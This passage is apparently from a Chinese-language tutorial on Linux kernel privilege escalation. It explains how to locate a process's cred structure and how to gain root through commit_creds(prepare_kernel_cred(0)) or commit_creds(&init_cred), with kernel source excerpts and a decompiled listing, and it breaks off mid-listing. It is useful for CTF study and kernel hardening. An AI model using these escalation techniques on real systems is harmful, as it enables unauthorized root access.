<p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid~fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred (gdb dump下来扫magic)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p>
<ul>
<li><strong>间接定位</strong></li>
</ul>
<p><strong>task_struct</strong></p>
<p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p>
<ol>
<li>定位当前进程 <code>task_struct</code> 结构体的地址</li>
<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li>
<li>获取 <code>cred</code> 具体的地址</li>
</ol>
<p><strong>comm</strong></p>
<p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure></div>

<p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p>
<h3 id="commit-creds-prepare-kernel-cred-0"><a href="#commit-creds-prepare-kernel-cred-0" class="headerlink" title="commit_creds(prepare_kernel_cred(0))"></a>commit_creds(prepare_kernel_cred(0))</h3><p>只要我们改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。内核空间下面有两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 <code>cred</code> 结构体，并返回一个新的 <code>cred</code> 结构体，需要注意的是 <code>daemon</code> 参数应为有效的进程描述符地址或者 <code>NULL</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="built_in">prepare_kernel_cred</span>(<span class="keyword">struct</span> task_struct *daemon)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = <span class="built_in">kmem_cache_alloc</span>(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">kdebug</span>(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = <span class="built_in">get_task_cred</span>(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = <span class="built_in">get_cred</span>(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">validate_creds</span>(old);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">	<span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">atomic_set</span>(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">set_cred_subscribers</span>(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">get_uid</span>(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	<span class="built_in">get_user_ns</span>(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">	<span class="built_in">get_group_info</span>(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">new</span>-&gt;ucounts = <span class="built_in">get_ucounts</span>(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">security_prepare_creds</span>(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="built_in">validate_creds</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	<span class="built_in">put_cred</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">task_struct</span> *task = current;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old = task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">kdebug</span>(<span class="string">&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">	       <span class="built_in">atomic_read</span>(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">	       <span class="built_in">read_cred_subscribers</span>(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">BUG_ON</span>(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="built_in">BUG_ON</span>(<span class="built_in">read_cred_subscribers</span>(old) &lt; <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">validate_creds</span>(old);</span><br><span class="line">	<span class="built_in">validate_creds</span>(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="built_in">BUG_ON</span>(<span class="built_in">atomic_read</span>(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">get_cred</span>(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">	    !<span class="built_in">cred_cap_issubset</span>(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			<span class="built_in">set_dumpable</span>(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="built_in">smp_wmb</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		<span class="built_in">key_fsuid_changed</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		<span class="built_in">key_fsgid_changed</span>(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">alter_cred_subscribers</span>(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		<span class="built_in">inc_rlimit_ucounts</span>(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">rcu_assign_pointer</span>(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="built_in">rcu_assign_pointer</span>(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		<span class="built_in">dec_rlimit_ucounts</span>(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">alter_cred_subscribers</span>(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		<span class="built_in">proc_id_connector</span>(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		<span class="built_in">proc_id_connector</span>(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说我们只要想办法在内核空间执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 <code>root</code> 权限，<code>0</code> 表示 以 <code>0</code> 号进程作为参考准备新的 <code>credentials</code>。如果进行 <code>ROP</code> 提权有一个难点就是寻找将 rax 赋值给 rdi 的 gadget 。可以尝试搜索 <code>xchg rax, rdi</code> ，<code>push rax; pop rdi</code>，<code>mov rdi, rax</code> 等 <code>gadget</code> 。</p>
<p>另外 <code>init_cred</code> 是在内核当中有一个特殊的 <code>cred</code> ，它是 <code>init</code> 进程的 <code>cred</code> ，因此其权限为 root ，且该 <code>cred</code> 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 <code>init_cred</code> 的地址，那么我们就只需要执行一次 <code>commit_creds(&amp;init_cred)</code> 便能完成提权，不过有些内核中没有 <code>init_cred</code>（实际上多数情况是由于缺少符号找不到 <code>init_cred</code>，因此需要逆向分析 <code>prepare_kernel_cred</code> 函数来定位 <code>init_cred</code>）。不过自从内核版本 <code>6.2</code> 起，<code>prepare_kernel_cred(NULL)</code> 将不再拷贝 <code>init_cred</code>，而是将其视为一个运行时错误并返回 <code>NULL</code>，这使得这种提权方法无法再应用于 <code>6.2</code> 及更高版本的内核：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="built_in">prepare_kernel_cred</span>(<span class="keyword">struct</span> task_struct *daemon)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WARN_ON_ONCE</span>(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> = <span class="built_in">kmem_cache_alloc</span>(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><p>在内核初始化过程当中会以 root 权限启动 <code>init</code> 进程，其 cred 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，由此不难想到的是我们可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">    .usage          = ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    .subscribers        = ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">    .magic          = CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    .uid            = GLOBAL_ROOT_UID,</span><br><span class="line">    .gid            = GLOBAL_ROOT_GID,</span><br><span class="line">    .suid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .sgid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .euid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .egid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .fsuid          = GLOBAL_ROOT_UID,</span><br><span class="line">    .fsgid          = GLOBAL_ROOT_GID,</span><br><span class="line">    .securebits     = SECUREBITS_DEFAULT,</span><br><span class="line">    .cap_inheritable    = CAP_EMPTY_SET,</span><br><span class="line">    .cap_permitted      = CAP_FULL_SET,</span><br><span class="line">    .cap_effective      = CAP_FULL_SET,</span><br><span class="line">    .cap_bset       = CAP_FULL_SET,</span><br><span class="line">    .user           = INIT_USER,</span><br><span class="line">    .user_ns        = &amp;init_user_ns,</span><br><span class="line">    .group_info     = &amp;init_groups,</span><br><span class="line">    .ucounts        = &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h4 id="init-cred-定位"><a href="#init-cred-定位" class="headerlink" title="init_cred 定位"></a>init_cred 定位</h4><p>init_cred 是在内核当中有一个特殊的 cred ，它是 init 进程的 cred ，因此其权限为 root ，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 commit_creds(&amp;init_cred) 便能完成提权，不过有些内核中没有 init_cred（实际上多数情况是由于缺少符号找不到 init_cred，因此需要逆向分析 prepare_kernel_cred 函数来定位 init_cred）。根据不同内核源码，确定init_cred位置即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">prepare_kernel_cred</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> *task_cred; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v1 = (_DWORD *)kmem_cache_alloc(qword_FFFFFFFF82735900, <span class="number">20971712LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    task_cred = (<span class="type">int</span> *)get_task_cred(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _InterlockedIncrement(dword_FFFFFFFF8223D1A0);</span><br><span class="line">    task_cred = dword_FFFFFFFF8223D1A0; <span class="comment">// init_cred</span></span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(v1, task_cred, <span class="number">0xA8</span>uLL);</span><br><span class="line">  *v1 = <span class="number">1</span>;</span><br><span class="line">  _InterlockedIncrement(*((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 **)v1 + <span class="number">16</span>));</span><br><span class="line">  _InterlockedIncrement(*((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 **)v1 + <span class="number">18</span>));</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">11</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">12</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">13</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">14</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">80</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v1 + <span class="number">15</span>) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)security_prepare_creds(v1, task_cred, <span class="number">20971712LL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( 